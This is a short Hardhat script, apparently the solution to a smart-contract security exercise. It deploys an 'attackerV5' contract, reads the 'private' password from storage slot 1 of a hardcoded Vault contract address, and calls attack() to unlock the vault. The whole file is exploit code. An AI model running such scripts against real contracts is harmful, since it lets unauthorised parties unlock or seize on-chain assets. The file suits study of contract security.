const { ethers } = require("hardhat");


const ATTACKER_NAME = "attackerV5";
const VaultContract="0xf7bB6DDC9FC17228e6b7b2379250664E885Ae6de"


async function main() {
  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(VaultContract);
  await attackerContract.deployed();
 
  console.log("contract address: ", attackerContract.address);

  // Descodificando los datos 
  const slot1Bytes = await ethers.provider.getStorageAt(VaultContract, 1);
  console.log("Private Data: ", slot1Bytes);

  const tx = await attackerContract.attack(slot1Bytes);
  await tx.wait();

  console.log("Unlocked successfully 🔓");

}

main().catch(error => {
  console.error(error);
  process.exit(1);
});